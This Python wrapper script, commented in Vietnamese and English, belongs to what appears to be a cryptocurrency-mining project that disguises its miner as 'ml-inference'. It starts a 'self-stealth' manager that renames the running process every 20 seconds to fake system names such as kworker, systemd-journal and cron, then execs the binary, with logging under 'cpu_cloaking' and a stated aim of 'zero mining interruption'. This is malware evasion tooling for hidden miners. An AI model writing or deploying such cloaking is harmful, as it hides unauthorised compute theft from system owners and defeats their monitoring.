#!/usr/bin/env python3
"""mining_environment.scripts.stealth_ml_inference

🔒 **[Stealth ML-Inference Wrapper]** (wrapper ẩn danh cho ml-inference)

Script wrapper khởi động **ml-inference process** với **[Self-Stealth capability]** (khả năng tự ẩn danh).
Giải quyết vấn đề **[Process Ownership Mismatch]** bằng cách cho phép process tự thay đổi tên từ bên trong.

⚠️ WORKFLOW:
1. Khởi động **[Self-Stealth Manager]** trong process hiện tại
2. Thay đổi process name thành system process giả
3. Exec **ml-inference** binary để thay thế process image
4. **Self-Stealth Manager** tiếp tục hoạt động trong ml-inference process

✅ ADVANTAGES:
- Không cần external PID tracking
- Không cần special privileges  
- Process tự quản lý stealth mode
- Zero mining interruption risk
"""

import os
import sys
import signal
import time
import subprocess
from pathlib import Path

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

# Import self-stealth module (updated path)
try:
    from mining_environment.stealth.core.self_stealth import start_self_stealth, SelfStealthManager
    from mining_environment.scripts.unified_logging import get_unified_logger
except ImportError as e:
    print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
    sys.exit(1)

# Setup logging
logger = get_unified_logger('mining_environment.cpu_cloaking')

def signal_handler(signum, frame):
    """
    **[Signal Handler]** (xử lý tín hiệu) để đảm bảo cleanup khi process bị terminate.
    """
    logger.info(f"🛑 [STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")
    
    # Get global stealth manager if exists
    from mining_environment.stealth.core.self_stealth import get_global_stealth_manager
    stealth_manager = get_global_stealth_manager()
    
    if stealth_manager:
        stealth_manager.stop_stealth_mode()
        logger.info("✅ [STEALTH-WRAPPER] Stealth mode cleaned up")
    
    sys.exit(0)

def main():
    """
    **[Main Function]** (hàm chính) - khởi động stealth mode và exec ml-inference.
    """
    try:
        logger.info("🚀 [STEALTH-WRAPPER] Starting Stealth ML-Inference Wrapper")
        
        # Register signal handlers để cleanup khi bị terminate
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGINT, signal_handler)
        
        # Parse command line arguments (forward tất cả args to ml-inference)
        ml_inference_args = sys.argv[1:]  # Remove script name
        logger.info(f"🔍 [STEALTH-WRAPPER] ML-Inference args: {ml_inference_args}")
        
        # Get ml-inference binary path from environment
        ml_inference_path = os.getenv('ML_COMMAND', '/usr/local/bin/ml-inference')
        if not os.path.exists(ml_inference_path):
            logger.error(f"❌ [STEALTH-WRAPPER] ML-Inference binary not found: {ml_inference_path}")
            sys.exit(1)
        
        # Verify binary is executable
        if not os.access(ml_inference_path, os.X_OK):
            logger.error(f"❌ [STEALTH-WRAPPER] ML-Inference binary not executable: {ml_inference_path}")
            sys.exit(1)
        
        logger.info(f"✅ [STEALTH-WRAPPER] ML-Inference binary found: {ml_inference_path}")
        
        # Start self-stealth mode trước khi exec
        # Sử dụng rotation interval ngắn hơn để tăng stealth effectiveness
        stealth_manager = start_self_stealth(
            rotation_interval=20,  # 20 giây thay vì 30
            custom_names=[
                "systemd-sleep",
                "kworker/u4:0", 
                "migration/1",
                "rcu_gp",
                "systemd-journal",
                "systemd-resolve",
                "dbus-daemon",
                "NetworkManager",
                "cron",
                "irqbalance"
            ]
        )
        
        # Set global manager để signal handler có thể access
        from mining_environment.stealth.core.self_stealth import set_global_stealth_manager
        set_global_stealth_manager(stealth_manager)
        
        logger.info("✅ [STEALTH-WRAPPER] Self-stealth mode activated")
        
        # Log stealth status
        status = stealth_manager.get_status()
        logger.info(f"🔍 [STEALTH-WRAPPER] Stealth status: {status}")
        
        # **CRITICAL**: Small delay để đảm bảo stealth mode hoàn toàn active
        time.sleep(2)
        
        # Verify stealth name change
        current_name = stealth_manager.get_current_process_name()
        logger.info(f"✅ [STEALTH-WRAPPER] Process name changed to: '{current_name}'")
        
        # Prepare command để exec ml-inference
        exec_command = [ml_inference_path] + ml_inference_args
        logger.info(f"🔄 [STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")
        
        # **EXEC ML-INFERENCE**: Thay thế process image nhưng giữ nguyên stealth manager
        # Note: os.execv sẽ thay thế process image nhưng stealth_manager thread sẽ continue
        try:
            # Flush logs trước khi exec
            import logging
            logging.shutdown()
            
            # Use os.execv để replace process image
            os.execv(ml_inference_path, exec_command)
            
        except Exception as e:
            logger.error(f"❌ [STEALTH-WRAPPER] Failed to exec ml-inference: {e}")
            # Fallback to subprocess if exec fails
            logger.info("🔄 [STEALTH-WRAPPER] Falling back to subprocess mode")
            
            try:
                # Run ml-inference as subprocess
                process = subprocess.Popen(
                    exec_command,
                    stdout=sys.stdout,
                    stderr=sys.stderr
                )
                
                logger.info(f"✅ [STEALTH-WRAPPER] ML-Inference started as subprocess PID: {process.pid}")
                
                # Wait for subprocess to complete
                return_code = process.wait()
                logger.info(f"🔚 [STEALTH-WRAPPER] ML-Inference subprocess completed with code: {return_code}")
                
                # Cleanup stealth mode
                stealth_manager.stop_stealth_mode()
                sys.exit(return_code)
                
            except Exception as subprocess_error:
                logger.error(f"❌ [STEALTH-WRAPPER] Subprocess fallback failed: {subprocess_error}")
                stealth_manager.stop_stealth_mode()
                sys.exit(1)
    
    except Exception as e:
        logger.error(f"❌ [STEALTH-WRAPPER] Unexpected error: {e}")
        import traceback
        logger.error(f"❌ [STEALTH-WRAPPER] Traceback: {traceback.format_exc()}")
        sys.exit(1)

if __name__ == "__main__":
    main()